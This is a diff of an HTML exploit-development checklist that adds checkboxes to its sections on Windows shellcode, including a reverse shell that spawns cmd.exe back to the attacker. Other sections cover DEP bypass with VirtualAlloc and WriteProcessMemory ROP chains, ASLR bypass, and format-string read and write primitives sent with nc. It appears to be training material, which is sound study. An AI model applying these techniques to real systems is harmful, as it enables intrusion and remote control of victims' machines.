-        <li><code>Export_Dir = [kernel32_base + PE_sig + 0x78]</code> &mdash; DataDirectory[0] RVA</li>
-        <li>Add kernel32 base to get absolute address of Export Directory</li>
+        <li><input type="checkbox"> <code>PE_signature = [kernel32_base + 0x3C]</code> &mdash; e_lfanew offset</li>
+        <li><input type="checkbox"> <code>Export_Dir = [kernel32_base + PE_sig + 0x78]</code> &mdash; DataDirectory[0] RVA</li>
+        <li><input type="checkbox"> Add kernel32 base to get absolute address of Export Directory</li>
       </ul>
     </li>
-    <li>Walk the export tables:
+    <li><input type="checkbox"> Walk the export tables:
       <ul>
-        <li><code>NumberOfNames = [ExportDir + 0x18]</code> &mdash; total named exports</li>
-        <li><code>AddressOfFunctions = [ExportDir + 0x1C]</code> &mdash; array of function RVAs</li>
-        <li><code>AddressOfNames = [ExportDir + 0x20]</code> &mdash; array of name string RVAs</li>
-        <li><code>AddressOfNameOrdinals = [ExportDir + 0x24]</code> &mdash; ordinal mapping array</li>
+        <li><input type="checkbox"> <code>NumberOfNames = [ExportDir + 0x18]</code> &mdash; total named exports</li>
+        <li><input type="checkbox"> <code>AddressOfFunctions = [ExportDir + 0x1C]</code> &mdash; array of function RVAs</li>
+        <li><input type="checkbox"> <code>AddressOfNames = [ExportDir + 0x20]</code> &mdash; array of name string RVAs</li>
+        <li><input type="checkbox"> <code>AddressOfNameOrdinals = [ExportDir + 0x24]</code> &mdash; ordinal mapping array</li>
       </ul>
     </li>
-    <li>Use ROR-13 hash comparison for compact name matching:
+    <li><input type="checkbox"> Use ROR-13 hash comparison for compact name matching:
       <ul>
-        <li>Pre-compute hashes: <code>LoadLibraryA</code>, <code>GetProcAddress</code>, <code>VirtualAlloc</code>, <code>WinExec</code></li>
-        <li>Loop through AddressOfNames, hash each name with ROR-13, compare to target</li>
-        <li>On match: use ordinal to index into AddressOfFunctions &rarr; function address</li>
+        <li><input type="checkbox"> Pre-compute hashes: <code>LoadLibraryA</code>, <code>GetProcAddress</code>, <code>VirtualAlloc</code>, <code>WinExec</code></li>
+        <li><input type="checkbox"> Loop through AddressOfNames, hash each name with ROR-13, compare to target</li>
+        <li><input type="checkbox"> On match: use ordinal to index into AddressOfFunctions &rarr; function address</li>
       </ul>
     </li>
   </ul>
@@ -1552,18 +1554,18 @@ hash_loop:
 
 <h3 id="methodology-shellcode-dev-null-free">1.7.3 Null-Free Encoding</h3>
   <ul>
-    <li>Replace instructions that produce null bytes:
+    <li><input type="checkbox"> Replace instructions that produce null bytes:
       <ul>
-        <li><code>xor eax, eax</code> instead of <code>mov eax, 0</code> (avoids <code>\x00\x00\x00\x00</code>)</li>
-        <li><code>xor eax, eax; inc eax</code> instead of <code>mov eax, 1</code></li>
-        <li><code>sub eax, eax</code> as an alternative zeroing technique</li>
+        <li><input type="checkbox"> <code>xor eax, eax</code> instead of <code>mov eax, 0</code> (avoids <code>\x00\x00\x00\x00</code>)</li>
+        <li><input type="checkbox"> <code>xor eax, eax; inc eax</code> instead of <code>mov eax, 1</code></li>
+        <li><input type="checkbox"> <code>sub eax, eax</code> as an alternative zeroing technique</li>
       </ul>
     </li>
-    <li>Handle null-terminated strings without null bytes:
+    <li><input type="checkbox"> Handle null-terminated strings without null bytes:
       <ul>
-        <li><code>xor ecx, ecx; push ecx</code> &mdash; push a null terminator from a register</li>
-        <li><code>push 0x636c6163</code> &mdash; push "calc" as a DWORD (reversed byte order)</li>
-        <li><code>mov ebx, esp</code> &mdash; EBX now points to "calc\x00" on the stack</li>
+        <li><input type="checkbox"> <code>xor ecx, ecx; push ecx</code> &mdash; push a null terminator from a register</li>
+        <li><input type="checkbox"> <code>push 0x636c6163</code> &mdash; push "calc" as a DWORD (reversed byte order)</li>
+        <li><input type="checkbox"> <code>mov ebx, esp</code> &mdash; EBX now points to "calc\x00" on the stack</li>
       </ul>
     </li>
   </ul>
@@ -1583,11 +1585,11 @@ call $+5                   ; pushes address of next instruction
 pop esi                    ; ESI = current code position
 ; now reference data as [esi + offset]</code></pre>
   <ul>
-    <li>Use CALL/POP delta for position-independent data references:
+    <li><input type="checkbox"> Use CALL/POP delta for position-independent data references:
       <ul>
-        <li><code>call $+5</code> pushes next instruction address onto stack</li>
-        <li><code>pop esi</code> &mdash; ESI now holds current code position</li>
-        <li>Calculate data offsets relative to ESI for string references</li>
+        <li><input type="checkbox"> <code>call $+5</code> pushes next instruction address onto stack</li>
+        <li><input type="checkbox"> <code>pop esi</code> &mdash; ESI now holds current code position</li>
+        <li><input type="checkbox"> Calculate data offsets relative to ESI for string references</li>
       </ul>
     </li>
   </ul>
@@ -1650,29 +1652,29 @@ pop esi                    ; ESI = current code position
 
 <h3 id="methodology-shellcode-dev-reverse-shell-asm">1.7.4 Reverse Shell Assembly</h3>
   <ul>
-    <li>Resolve the required APIs:
+    <li><input type="checkbox"> Resolve the required APIs:
       <ul>
-        <li><code>LoadLibraryA("ws2_32")</code> &mdash; load Winsock DLL</li>
-        <li><code>GetProcAddress</code> to resolve: <code>WSAStartup</code>, <code>WSASocketA</code>, <code>WSAConnect</code>, <code>CreateProcessA</code></li>
+        <li><input type="checkbox"> <code>LoadLibraryA("ws2_32")</code> &mdash; load Winsock DLL</li>
+        <li><input type="checkbox"> <code>GetProcAddress</code> to resolve: <code>WSAStartup</code>, <code>WSASocketA</code>, <code>WSAConnect</code>, <code>CreateProcessA</code></li>
       </ul>
     </li>
-    <li>Initialize Winsock and create a socket:
+    <li><input type="checkbox"> Initialize Winsock and create a socket:
       <ul>
-        <li><code>WSAStartup(0x0202, &wsadata)</code> &mdash; initialize Winsock 2.2</li>
-        <li><code>WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0)</code> &mdash; create TCP socket</li>
+        <li><input type="checkbox"> <code>WSAStartup(0x0202, &wsadata)</code> &mdash; initialize Winsock 2.2</li>
+        <li><input type="checkbox"> <code>WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0)</code> &mdash; create TCP socket</li>
       </ul>
     </li>
-    <li>Connect back to the attacker:
+    <li><input type="checkbox"> Connect back to the attacker:
       <ul>
-        <li>Build <code>sockaddr_in</code> structure: <code>AF_INET</code> + port (big-endian) + IP (big-endian)</li>
-        <li><code>WSAConnect(socket, &sockaddr, 16, 0, 0, 0, 0)</code></li>
+        <li><input type="checkbox"> Build <code>sockaddr_in</code> structure: <code>AF_INET</code> + port (big-endian) + IP (big-endian)</li>
+        <li><input type="checkbox"> <code>WSAConnect(socket, &sockaddr, 16, 0, 0, 0, 0)</code></li>
       </ul>
     </li>
-    <li>Spawn cmd.exe with redirected I/O:
+    <li><input type="checkbox"> Spawn cmd.exe with redirected I/O:
       <ul>
-        <li>Build <code>STARTUPINFO</code> with <code>hStdInput = socket</code>, <code>hStdOutput = socket</code>, <code>hStdError = socket</code></li>
-        <li>Set <code>dwFlags = STARTF_USESTDHANDLES</code> and <code>wShowWindow = SW_HIDE</code></li>
-        <li><code>CreateProcessA(NULL, "cmd.exe", ...)</code> &mdash; spawns a shell over the socket</li>
+        <li><input type="checkbox"> Build <code>STARTUPINFO</code> with <code>hStdInput = socket</code>, <code>hStdOutput = socket</code>, <code>hStdError = socket</code></li>
+        <li><input type="checkbox"> Set <code>dwFlags = STARTF_USESTDHANDLES</code> and <code>wShowWindow = SW_HIDE</code></li>
+        <li><input type="checkbox"> <code>CreateProcessA(NULL, "cmd.exe", ...)</code> &mdash; spawns a shell over the socket</li>
       </ul>
     </li>
   </ul>
@@ -1721,52 +1723,52 @@ mov ecx, esp                    ; ECX → sockaddr_in
 ; dwFlags = STARTF_USESTDHANDLES (0x100)</code></pre>
 <p><strong>References:</strong> <a href="https://shell-storm.org/shellcode/" target="_blank" rel="noopener noreferrer">Shell-Storm Shellcode DB</a> &middot; <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a></p>
 
-<ul><li><strong>General references:</strong> <a href="https://shell-storm.org/shellcode/" target="_blank" rel="noopener noreferrer">Shell-Storm Shellcode DB</a> &middot; <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a> &middot; <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html" target="_blank" rel="noopener noreferrer">Intel x86 manuals</a></li></ul>
+<ul><li><input type="checkbox"> <strong>General references:</strong> <a href="https://shell-storm.org/shellcode/" target="_blank" rel="noopener noreferrer">Shell-Storm Shellcode DB</a> &middot; <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a> &middot; <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html" target="_blank" rel="noopener noreferrer">Intel x86 manuals</a></li></ul>
 
 <h3 id="methodology-dep-bypass">1.8 DEP Bypass with ROP</h3>
-<ul><li>When Data Execution Prevention is active, build a Return-Oriented Programming chain to call VirtualAlloc (or WriteProcessMemory) and make your shellcode executable.</li></ul>
+<ul><li><input type="checkbox"> When Data Execution Prevention is active, build a Return-Oriented Programming chain to call VirtualAlloc (or WriteProcessMemory) and make your shellcode executable.</li></ul>
 <h3 id="methodology-dep-bypass-dep-confirm">1.8.1 DEP Confirmation</h3>
   <ul>
-    <li>Verify DEP is blocking execution:
+    <li><input type="checkbox"> Verify DEP is blocking execution:
       <ul>
-        <li><code>!vprot esp</code> &mdash; shows <code>PAGE_READWRITE</code> = DEP is active (no EXECUTE)</li>
-        <li>Access violation at EIP on the stack = DEP prevented execution</li>
-        <li><code>!address esp</code> confirms the stack region lacks execute permission</li>
+        <li><input type="checkbox"> <code>!vprot esp</code> &mdash; shows <code>PAGE_READWRITE</code> = DEP is active (no EXECUTE)</li>
+        <li><input type="checkbox"> Access violation at EIP on the stack = DEP prevented execution</li>
+        <li><input type="checkbox"> <code>!address esp</code> confirms the stack region lacks execute permission</li>
       </ul>
     </li>
-    <li>Check system-wide DEP policy:
+    <li><input type="checkbox"> Check system-wide DEP policy:
       <ul>
-        <li><code>bcdedit /enum | findstr nx</code> &mdash; OptIn / OptOut / AlwaysOn</li>
-        <li>OptIn = only system processes and opted-in apps</li>
-        <li>AlwaysOn = all processes (requires ROP or WriteProcessMemory bypass)</li>
+        <li><input type="checkbox"> <code>bcdedit /enum | findstr nx</code> &mdash; OptIn / OptOut / AlwaysOn</li>
+        <li><input type="checkbox"> OptIn = only system processes and opted-in apps</li>
+        <li><input type="checkbox"> AlwaysOn = all processes (requires ROP or WriteProcessMemory bypass)</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-dep-bypass-gadget-discovery">1.8.2 Gadget Discovery</h3>
   <ul>
-    <li>Scan target modules for usable gadgets:
+    <li><input type="checkbox"> Scan target modules for usable gadgets:
       <ul>
-        <li><code>rp-win-x86.exe -f target.dll --rop 5 --unique > gadgets.txt</code> &mdash; RP++ (fast, comprehensive)</li>
-        <li><code>ropper --file target.dll --search "pop eax; ret"</code> &mdash; search for specific gadgets</li>
-        <li><code>ropper --file target.dll --chain "virtualalloc"</code> &mdash; attempt automatic chain generation</li>
+        <li><input type="checkbox"> <code>rp-win-x86.exe -f target.dll --rop 5 --unique > gadgets.txt</code> &mdash; RP++ (fast, comprehensive)</li>
+        <li><input type="checkbox"> <code>ropper --file target.dll --search "pop eax; ret"</code> &mdash; search for specific gadgets</li>
+        <li><input type="checkbox"> <code>ropper --file target.dll --chain "virtualalloc"</code> &mdash; attempt automatic chain generation</li>
       </ul>
     </li>
-    <li>Essential gadgets to find:
+    <li><input type="checkbox"> Essential gadgets to find:
       <ul>
-        <li><code>pop eax; ret</code> &mdash; load value into EAX</li>
-        <li><code>pop ecx; ret</code> &mdash; load value into ECX</li>
-        <li><code>pop edx; ret</code> &mdash; load value into EDX</li>
-        <li><code>pop ebx; ret</code> &mdash; load value into EBX</li>
-        <li><code>pushad; ret</code> &mdash; push all registers as a VirtualAlloc call frame</li>
-        <li><code>mov eax, [eax]; ret</code> &mdash; dereference pointer (for IAT resolution)</li>
+        <li><input type="checkbox"> <code>pop eax; ret</code> &mdash; load value into EAX</li>
+        <li><input type="checkbox"> <code>pop ecx; ret</code> &mdash; load value into ECX</li>
+        <li><input type="checkbox"> <code>pop edx; ret</code> &mdash; load value into EDX</li>
+        <li><input type="checkbox"> <code>pop ebx; ret</code> &mdash; load value into EBX</li>
+        <li><input type="checkbox"> <code>pushad; ret</code> &mdash; push all registers as a VirtualAlloc call frame</li>
+        <li><input type="checkbox"> <code>mov eax, [eax]; ret</code> &mdash; dereference pointer (for IAT resolution)</li>
       </ul>
     </li>
-    <li>Search specific modules with pykd:
+    <li><input type="checkbox"> Search specific modules with pykd:
       <ul>
-        <li>Use pykd to scan module memory ranges for custom gadget byte patterns</li>
-        <li><code>pykd.loadBytes(base, size)</code> &mdash; read entire module into a byte array</li>
-        <li>Search for specific opcode sequences and verify alignment</li>
+        <li><input type="checkbox"> Use pykd to scan module memory ranges for custom gadget byte patterns</li>
+        <li><input type="checkbox"> <code>pykd.loadBytes(base, size)</code> &mdash; read entire module into a byte array</li>
+        <li><input type="checkbox"> Search for specific opcode sequences and verify alignment</li>
       </ul>
     </li>
   </ul>
@@ -1783,25 +1785,25 @@ ropper --file target.dll --chain "virtualalloc"   # auto-generate chain</code></
 
 <h3 id="methodology-dep-bypass-virtualalloc-rop">1.8.3 VirtualAlloc ROP Chain</h3>
   <ul>
-    <li>Resolve VirtualAlloc address from the IAT:
+    <li><input type="checkbox"> Resolve VirtualAlloc address from the IAT:
       <ul>
-        <li>Find VirtualAlloc IAT entry: <code>dps targetapp+IAT_offset L1</code></li>
-        <li>Use a dereference gadget: <code>pop eax; ret</code> + IAT_ptr + <code>mov eax, [eax]; ret</code></li>
-        <li>EAX now holds the runtime address of VirtualAlloc</li>
+        <li><input type="checkbox"> Find VirtualAlloc IAT entry: <code>dps targetapp+IAT_offset L1</code></li>
+        <li><input type="checkbox"> Use a dereference gadget: <code>pop eax; ret</code> + IAT_ptr + <code>mov eax, [eax]; ret</code></li>
+        <li><input type="checkbox"> EAX now holds the runtime address of VirtualAlloc</li>
       </ul>
     </li>
-    <li>Load the VirtualAlloc parameters into registers:
+    <li><input type="checkbox"> Load the VirtualAlloc parameters into registers:
       <ul>
-        <li><code>pop ebx; ret</code> + <code>0x00000201</code> &mdash; dwSize (513 bytes, enough for shellcode)</li>
-        <li><code>pop ecx; ret</code> + <code>0x00000040</code> &mdash; flProtect (PAGE_EXECUTE_READWRITE)</li>
-        <li><code>pop edx; ret</code> + <code>0x00001000</code> &mdash; flAllocationType (MEM_COMMIT)</li>
+        <li><input type="checkbox"> <code>pop ebx; ret</code> + <code>0x00000201</code> &mdash; dwSize (513 bytes, enough for shellcode)</li>
+        <li><input type="checkbox"> <code>pop ecx; ret</code> + <code>0x00000040</code> &mdash; flProtect (PAGE_EXECUTE_READWRITE)</li>
+        <li><input type="checkbox"> <code>pop edx; ret</code> + <code>0x00001000</code> &mdash; flAllocationType (MEM_COMMIT)</li>
       </ul>
     </li>
-    <li>Execute PUSHAD to build the call frame:
+    <li><input type="checkbox"> Execute PUSHAD to build the call frame:
       <ul>
-        <li><code>pushad; ret</code> pushes all registers onto the stack in order: EAX(VA addr), ECX, EDX, EBX, ESP(return), EBP, ESI, EDI</li>
-        <li>This creates the cdecl call frame that VirtualAlloc expects</li>
-        <li>VirtualAlloc returns the new RWX memory region address in EAX</li>
+        <li><input type="checkbox"> <code>pushad; ret</code> pushes all registers onto the stack in order: EAX(VA addr), ECX, EDX, EBX, ESP(return), EBP, ESI, EDI</li>
+        <li><input type="checkbox"> This creates the cdecl call frame that VirtualAlloc expects</li>
+        <li><input type="checkbox"> VirtualAlloc returns the new RWX memory region address in EAX</li>
       </ul>
     </li>
   </ul>
@@ -1830,76 +1832,76 @@ rop_chain += p(0x100163a0)     # pushad; ret
 # After VirtualAlloc returns, EAX = new RWX region
 # Shellcode follows the ROP chain on the stack</code></pre>
   <ul>
-    <li>Copy shellcode and jump:
+    <li><input type="checkbox"> Copy shellcode and jump:
       <ul>
-        <li>After VirtualAlloc returns, copy shellcode to the allocated RWX region</li>
-        <li>Use <code>rep movsb</code> gadgets or a memcpy chain</li>
-        <li>JMP to the RWX region to execute shellcode</li>
+        <li><input type="checkbox"> After VirtualAlloc returns, copy shellcode to the allocated RWX region</li>
+        <li><input type="checkbox"> Use <code>rep movsb</code> gadgets or a memcpy chain</li>
+        <li><input type="checkbox"> JMP to the RWX region to execute shellcode</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-dep-bypass-wpm-alternative">1.8.4 WriteProcessMemory Alternative</h3>
   <ul>
-    <li>Use WriteProcessMemory to overwrite executable code:
+    <li><input type="checkbox"> Use WriteProcessMemory to overwrite executable code:
       <ul>
-        <li><code>WriteProcessMemory(0xFFFFFFFF, code_section_addr, shellcode_addr, len, NULL)</code></li>
-        <li>Handle = <code>-1</code> (<code>0xFFFFFFFF</code>) = current process pseudo-handle</li>
-        <li>Target = address within an existing executable code section</li>
+        <li><input type="checkbox"> <code>WriteProcessMemory(0xFFFFFFFF, code_section_addr, shellcode_addr, len, NULL)</code></li>
+        <li><input type="checkbox"> Handle = <code>-1</code> (<code>0xFFFFFFFF</code>) = current process pseudo-handle</li>
+        <li><input type="checkbox"> Target = address within an existing executable code section</li>
       </ul>
     </li>
-    <li>Advantage over VirtualAlloc:
+    <li><input type="checkbox"> Advantage over VirtualAlloc:
       <ul>
-        <li>No new memory allocation &mdash; writes directly into an existing RX section</li>
-        <li>Overwrites code in-place, then execution falls through naturally</li>
-        <li>Fewer gadgets needed (no PUSHAD frame required)</li>
+        <li><input type="checkbox"> No new memory allocation &mdash; writes directly into an existing RX section</li>
+        <li><input type="checkbox"> Overwrites code in-place, then execution falls through naturally</li>
+        <li><input type="checkbox"> Fewer gadgets needed (no PUSHAD frame required)</li>
       </ul>
     </li>
-    <li>Build the ROP chain:
+    <li><input type="checkbox"> Build the ROP chain:
       <ul>
-        <li>Resolve WriteProcessMemory from IAT (same dereference pattern)</li>
-        <li>Set up parameters: hProcess, lpBaseAddress, lpBuffer (stack pointer), nSize, lpNumberOfBytesWritten</li>
-        <li>Shellcode is already on the stack &mdash; WPM copies it to the code section</li>
+        <li><input type="checkbox"> Resolve WriteProcessMemory from IAT (same dereference pattern)</li>
+        <li><input type="checkbox"> Set up parameters: hProcess, lpBaseAddress, lpBuffer (stack pointer), nSize, lpNumberOfBytesWritten</li>
+        <li><input type="checkbox"> Shellcode is already on the stack &mdash; WPM copies it to the code section</li>
       </ul>
     </li>
   </ul>
 
-<ul><li><strong>General references:</strong> <a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/" target="_blank" rel="noopener noreferrer">Corelan ROP</a> &middot; <a href="https://ropemporium.com/" target="_blank" rel="noopener noreferrer">ROP Emporium</a></li></ul>
+<ul><li><input type="checkbox"> <strong>General references:</strong> <a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/" target="_blank" rel="noopener noreferrer">Corelan ROP</a> &middot; <a href="https://ropemporium.com/" target="_blank" rel="noopener noreferrer">ROP Emporium</a></li></ul>
 
 <h3 id="methodology-aslr-bypass">1.9 ASLR Bypass</h3>
-<ul><li>Address Space Layout Randomization moves module bases each reboot. Bypass it by using non-ASLR modules, leaking a pointer, or doing a partial overwrite.</li></ul>
+<ul><li><input type="checkbox"> Address Space Layout Randomization moves module bases each reboot. Bypass it by using non-ASLR modules, leaking a pointer, or doing a partial overwrite.</li></ul>
 <h3 id="methodology-aslr-bypass-non-aslr">1.9.1 Non-ASLR Module Exploitation</h3>
   <ul>
-    <li>Find modules compiled without ASLR:
+    <li><input type="checkbox"> Find modules compiled without ASLR:
       <ul>
-        <li><code>!py mona modules</code> &mdash; look for ASLR = False in the output table</li>
-        <li><code>lm</code> across multiple reboots &mdash; if base doesn&rsquo;t change, ASLR is off</li>
-        <li>Third-party DLLs, older modules, and plugin DLLs often lack ASLR</li>
+        <li><input type="checkbox"> <code>!py mona modules</code> &mdash; look for ASLR = False in the output table</li>
+        <li><input type="checkbox"> <code>lm</code> across multiple reboots &mdash; if base doesn&rsquo;t change, ASLR is off</li>
+        <li><input type="checkbox"> Third-party DLLs, older modules, and plugin DLLs often lack ASLR</li>
       </ul>
     </li>
-    <li>Use all gadgets and addresses from the non-ASLR module:
+    <li><input type="checkbox"> Use all gadgets and addresses from the non-ASLR module:
       <ul>
-        <li>JMP ESP, POP/POP/RET, ROP gadgets &mdash; all from the same static-base module</li>
-        <li>Address bytes must still avoid bad characters</li>
-        <li>If the only non-ASLR module is small, you may need to combine with another technique</li>
+        <li><input type="checkbox"> JMP ESP, POP/POP/RET, ROP gadgets &mdash; all from the same static-base module</li>
+        <li><input type="checkbox"> Address bytes must still avoid bad characters</li>
+        <li><input type="checkbox"> If the only non-ASLR module is small, you may need to combine with another technique</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-aslr-bypass-info-leak">1.9.2 Information Leak</h3>
   <ul>
-    <li>Leak a runtime pointer from the application:
+    <li><input type="checkbox"> Leak a runtime pointer from the application:
       <ul>
-        <li>Format string vulnerability: read stack values that contain code pointers</li>
-        <li>Over-read vulnerability: read past a buffer boundary to expose adjacent pointers</li>
-        <li>Error messages that include memory addresses (verbose debug output)</li>
+        <li><input type="checkbox"> Format string vulnerability: read stack values that contain code pointers</li>
+        <li><input type="checkbox"> Over-read vulnerability: read past a buffer boundary to expose adjacent pointers</li>
+        <li><input type="checkbox"> Error messages that include memory addresses (verbose debug output)</li>
       </ul>
     </li>
-    <li>Calculate module base from the leaked pointer:
+    <li><input type="checkbox"> Calculate module base from the leaked pointer:
       <ul>
-        <li><code>module_base = leaked_addr - known_offset_in_module</code></li>
-        <li>Known offset = address in IDA minus IDA imagebase</li>
-        <li><code>gadget_runtime = module_base + (gadget_static - imagebase)</code> &mdash; rebase all addresses</li>
+        <li><input type="checkbox"> <code>module_base = leaked_addr - known_offset_in_module</code></li>
+        <li><input type="checkbox"> Known offset = address in IDA minus IDA imagebase</li>
+        <li><input type="checkbox"> <code>gadget_runtime = module_base + (gadget_static - imagebase)</code> &mdash; rebase all addresses</li>
       </ul>
     </li>
   </ul>
@@ -1917,55 +1919,55 @@ def rebase(ida_addr):
 
 JMP_ESP = struct.pack("&lt;I", rebase(0x00412345))  # example gadget</code></pre>
   <ul>
-    <li>Build the exploit with rebased addresses:
+    <li><input type="checkbox"> Build the exploit with rebased addresses:
       <ul>
-        <li>All return addresses and ROP gadgets use the calculated runtime base</li>
-        <li>Exploit must leak &rarr; calculate &rarr; build payload in one connection (or ASLR re-randomises)</li>
+        <li><input type="checkbox"> All return addresses and ROP gadgets use the calculated runtime base</li>
+        <li><input type="checkbox"> Exploit must leak &rarr; calculate &rarr; build payload in one connection (or ASLR re-randomises)</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-aslr-bypass-fmtstr-aslr">1.9.3 Format String ASLR Bypass</h3>
   <ul>
-    <li>Probe stack positions for code pointers:
+    <li><input type="checkbox"> Probe stack positions for code pointers:
       <ul>
-        <li>Send <code>%N$x</code> for N = 1 through 50 and record each leaked value</li>
-        <li>Identify values that look like code addresses (fall within module ranges)</li>
-        <li>Use <code>!address [leaked_value]</code> in WinDbg to identify which module it belongs to</li>
+        <li><input type="checkbox"> Send <code>%N$x</code> for N = 1 through 50 and record each leaked value</li>
+        <li><input type="checkbox"> Identify values that look like code addresses (fall within module ranges)</li>
+        <li><input type="checkbox"> Use <code>!address [leaked_value]</code> in WinDbg to identify which module it belongs to</li>
       </ul>
     </li>
-    <li>Calculate module base:
+    <li><input type="checkbox"> Calculate module base:
       <ul>
-        <li><code>module_base = leaked_code_ptr - known_offset</code></li>
-        <li>Known offset = the static address of that code location in IDA minus IDA imagebase</li>
+        <li><input type="checkbox"> <code>module_base = leaked_code_ptr - known_offset</code></li>
+        <li><input type="checkbox"> Known offset = the static address of that code location in IDA minus IDA imagebase</li>
       </ul>
     </li>
-    <li>Use the leak to build a write primitive:
+    <li><input type="checkbox"> Use the leak to build a write primitive:
       <ul>
-        <li>With the base known, compute saved-EIP address on the stack</li>
-        <li>Use <code>%hn</code> writes to overwrite saved EIP with the address of a ROP chain or gadget</li>
+        <li><input type="checkbox"> With the base known, compute saved-EIP address on the stack</li>
+        <li><input type="checkbox"> Use <code>%hn</code> writes to overwrite saved EIP with the address of a ROP chain or gadget</li>
       </ul>
     </li>
   </ul>
 
-<ul><li><strong>General references:</strong> <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a> &middot; <a href="https://connormcgarr.github.io/" target="_blank" rel="noopener noreferrer">Connor McGarr blog</a> &middot; <a href="https://exploit-notes.hdks.org/" target="_blank" rel="noopener noreferrer">Exploit Notes</a></li></ul>
+<ul><li><input type="checkbox"> <strong>General references:</strong> <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a> &middot; <a href="https://connormcgarr.github.io/" target="_blank" rel="noopener noreferrer">Connor McGarr blog</a> &middot; <a href="https://exploit-notes.hdks.org/" target="_blank" rel="noopener noreferrer">Exploit Notes</a></li></ul>
 
 <h3 id="methodology-format-string">1.10 Format String Attacks</h3>
-<ul><li>Format string vulnerabilities provide both read and write primitives. Use them to leak information, bypass ASLR, and write arbitrary values to control execution.</li></ul>
+<ul><li><input type="checkbox"> Format string vulnerabilities provide both read and write primitives. Use them to leak information, bypass ASLR, and write arbitrary values to control execution.</li></ul>
 <h3 id="methodology-format-string-fmtstr-detect-read">1.10.1 Detection &amp; Read Primitives</h3>
   <ul>
-    <li>Confirm the format string vulnerability:
+    <li><input type="checkbox"> Confirm the format string vulnerability:
       <ul>
-        <li>Send <code>%x %x %x %x %x %x %x %x</code> as input</li>
-        <li>If the server reflects hex stack values &rarr; vulnerable</li>
-        <li>If it prints literal <code>%x</code> &rarr; not vulnerable (proper format string handling)</li>
+        <li><input type="checkbox"> Send <code>%x %x %x %x %x %x %x %x</code> as input</li>
+        <li><input type="checkbox"> If the server reflects hex stack values &rarr; vulnerable</li>
+        <li><input type="checkbox"> If it prints literal <code>%x</code> &rarr; not vulnerable (proper format string handling)</li>
       </ul>
     </li>
-    <li>Read arbitrary memory with direct parameter access:
+    <li><input type="checkbox"> Read arbitrary memory with direct parameter access:
       <ul>
-        <li><code>%N$x</code> &mdash; read the N-th DWORD from the stack as hex</li>
-        <li><code>%N$p</code> &mdash; read as pointer (with <code>0x</code> prefix)</li>
-        <li><code>%N$s</code> &mdash; dereference the N-th DWORD as a pointer and read the string it points to</li>
+        <li><input type="checkbox"> <code>%N$x</code> &mdash; read the N-th DWORD from the stack as hex</li>
+        <li><input type="checkbox"> <code>%N$p</code> &mdash; read as pointer (with <code>0x</code> prefix)</li>
+        <li><input type="checkbox"> <code>%N$s</code> &mdash; dereference the N-th DWORD as a pointer and read the string it points to</li>
       </ul>
     </li>
   </ul>
@@ -1978,30 +1980,30 @@ echo '%1$x'  | nc [ip] [port]    # 1st stack arg as hex
 echo '%5$p'  | nc [ip] [port]    # 5th stack arg as pointer (0x prefix)
 echo '%12$s' | nc [ip] [port]    # dereference 12th arg and read string</code></pre>
   <ul>
-    <li>Find your input on the stack:
+    <li><input type="checkbox"> Find your input on the stack:
       <ul>
-        <li>Send <code>AAAA%x %x %x %x ...</code> and look for <code>41414141</code> in the output</li>
-        <li>Count the position &mdash; that&rsquo;s your direct parameter offset</li>
-        <li>Verify: <code>AAAA%N$x</code> should output <code>41414141</code> where N is the offset</li>
+        <li><input type="checkbox"> Send <code>AAAA%x %x %x %x ...</code> and look for <code>41414141</code> in the output</li>
+        <li><input type="checkbox"> Count the position &mdash; that&rsquo;s your direct parameter offset</li>
+        <li><input type="checkbox"> Verify: <code>AAAA%N$x</code> should output <code>41414141</code> where N is the offset</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-format-string-fmtstr-write">1.10.2 Write Primitives</h3>
   <ul>
-    <li>Understand the write specifiers:
+    <li><input type="checkbox"> Understand the write specifiers:
       <ul>
-        <li><code>%n</code> &mdash; writes 4 bytes (number of chars printed so far) to the address pointed to by the argument</li>
-        <li><code>%hn</code> &mdash; writes 2 bytes (lower half)</li>
-        <li><code>%hhn</code> &mdash; writes 1 byte (lowest byte)</li>
-        <li>Use <code>%hn</code> for most exploits &mdash; two 2-byte writes to compose a full DWORD</li>
+        <li><input type="checkbox"> <code>%n</code> &mdash; writes 4 bytes (number of chars printed so far) to the address pointed to by the argument</li>
+        <li><input type="checkbox"> <code>%hn</code> &mdash; writes 2 bytes (lower half)</li>
+        <li><input type="checkbox"> <code>%hhn</code> &mdash; writes 1 byte (lowest byte)</li>
+        <li><input type="checkbox"> Use <code>%hn</code> for most exploits &mdash; two 2-byte writes to compose a full DWORD</li>
       </ul>
     </li>
-    <li>Build a 4-byte write with two %hn writes:
+    <li><input type="checkbox"> Build a 4-byte write with two %hn writes:
       <ul>
-        <li>Place two target addresses on the stack: <code>target_addr</code> and <code>target_addr+2</code></li>
-        <li>Calculate padding: <code>pad_lo = low_word - bytes_already_printed</code> and <code>pad_hi = high_word - low_word</code></li>
-        <li>Format string: <code>[addr_lo][addr_hi]%[pad_lo]x%[off1]$hn%[pad_hi]x%[off2]$hn</code></li>
+        <li><input type="checkbox"> Place two target addresses on the stack: <code>target_addr</code> and <code>target_addr+2</code></li>
+        <li><input type="checkbox"> Calculate padding: <code>pad_lo = low_word - bytes_already_printed</code> and <code>pad_hi = high_word - low_word</code></li>
